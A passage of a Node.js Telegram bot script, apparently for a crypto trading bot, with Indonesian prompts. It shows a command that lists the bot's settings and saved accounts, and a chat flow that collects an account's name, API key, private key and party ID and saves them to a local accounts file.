    step: 'name',
    data: {}
  });

  await bot.sendMessage(chatId, 'Masukkan nama akun:');
});

bot.onText(/^\/detailset$/, async (msg) => {
  const chatId = msg.chat.id;
  const data = getAccountsData();

  if (!data.accounts.length) {
    await bot.sendMessage(chatId, 'Belum ada akun.');
    return;
  }

  const lines = [];

  lines.push(`Delay internal: ${state.delayMs / 1000} detik`);
  lines.push(`Mode: ${state.mode.toUpperCase()}`);
  lines.push(`Pair: ${state.market}`);
  lines.push('');
  lines.push('Detail akun:');

  data.accounts.forEach((acc, idx) => {
    lines.push(`${idx + 1}. ${acc.name || '-'} | orderType: ${acc.orderType || 'market'}`);
  });

  await bot.sendMessage(chatId, lines.join('\n'));
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = String(msg.text || '').trim();

  if (!addApiFlow.has(chatId)) return;
  if (text.startsWith('/')) return;

  const flow = addApiFlow.get(chatId);

  try {
    if (flow.step === 'name') {
      flow.data.name = text;
      flow.step = 'apiKey';
      addApiFlow.set(chatId, flow);
      await bot.sendMessage(chatId, 'Masukkan API Key:');
      return;
    }

    if (flow.step === 'apiKey') {
      flow.data.apiKey = text;
      flow.step = 'privateKey';
      addApiFlow.set(chatId, flow);
      await bot.sendMessage(chatId, 'Masukkan Loop Private Key:');
      return;
    }

    if (flow.step === 'privateKey') {
      flow.data.loopPrivateKey = text;
      flow.step = 'partyId';
      addApiFlow.set(chatId, flow);
      await bot.sendMessage(chatId, 'Masukkan Party ID:');
      return;
    }

    if (flow.step === 'partyId') {
      flow.data.partyId = text;

      const data = getAccountsData();

      data.accounts.push({
        name: flow.data.name,
        apiKey: flow.data.apiKey,
        loopPrivateKey: flow.data.loopPrivateKey,
        partyId: flow.data.partyId,
        network: data.common?.network || 'mainnet',
        orderType: 'market',
        side: 'buy'
      });

      writeAccountsFile(data);
      addApiFlow.delete(chatId);

      await bot.sendMessage(
        chatId,
        `Account berhasil ditambahkan:

Nama: ${flow.data.name}
API Key: ok
Private Key: ok
Party ID: ok`
      );
    }
  } catch (e) {
    addApiFlow.delete(chatId);
    await bot.sendMessage(chatId, `? Gagal menambahkan account:\n${e?.message || e}`);
  }
});

console.log(`[INFO] TEMPLEBOT READY ON TELEGRAM`);
